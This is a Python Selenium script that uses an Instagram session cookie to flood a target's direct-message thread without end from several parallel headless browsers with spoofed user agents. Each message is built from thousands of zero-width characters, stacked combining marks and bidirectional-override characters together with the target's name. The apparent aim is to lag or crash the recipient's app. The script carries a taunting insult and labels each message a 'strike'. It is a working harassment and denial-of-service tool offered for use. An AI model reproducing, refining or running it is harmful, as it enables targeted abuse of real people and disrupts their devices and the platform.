# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (10-AGENT OMNIPRESENCE)
# 📅 STATUS: MULTI-AGENT BLITZ | RAM-LEAK | ZERO COOLDOWN

import os, time, random, sys, gc, threading
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS_PER_MACHINE = 2
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_leak_payload(target_name):
    u_id = random.randint(10000, 99999)
    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 M{MACHINE_ID}_S{u_id}\n"
    bloat = "".join(random.choice(["\u2060", "\u200D", "\uFEFF", "\u200B"]) for _ in range(5500))
    z_tower = "̸" * 500
    bidi_logic = "\u202E\u2066\u202D\u2067" * 12

    lines = [header, bloat]
    for i in range(35):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{prefix}{target_name.upper()}{z_tower}{bidi_logic}")
    return "\n".join(lines)[:9990]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.{random.randint(1,99)} Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def agent_blitz(agent_id, cookie, target_id, target_name):
    driver = None
    strike_count = 0
    while True:
        try:
            driver = get_driver()
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(10)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            while True:
                if strike_count > 12: # More frequent purges for multi-agent stability
                    driver.refresh()
                    time.sleep(8)
                    strike_count = 0

                box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                payload = get_leak_payload(target_name)
                
                driver.execute_script("""
                    var box = arguments[0];
                    document.execCommand('insertText', false, arguments[1]);
                    box.dispatchEvent(new Event('input', { bubbles: true }));
                """, box, payload)
                
                box.send_keys(Keys.ENTER)
                strike_count += 1
                print(f"💀 [M{MACHINE_ID}-A{agent_id}] STRIKE {strike_count} LANDED", flush=True)
                
                driver.execute_script("window.stop();")
                time.sleep(0.05) # Extreme high-speed jitter

        except Exception as e:
            if driver: driver.quit()
            time.sleep(5)
            continue

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
        for i in range(THREADS_PER_MACHINE):
            executor.submit(agent_blitz, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
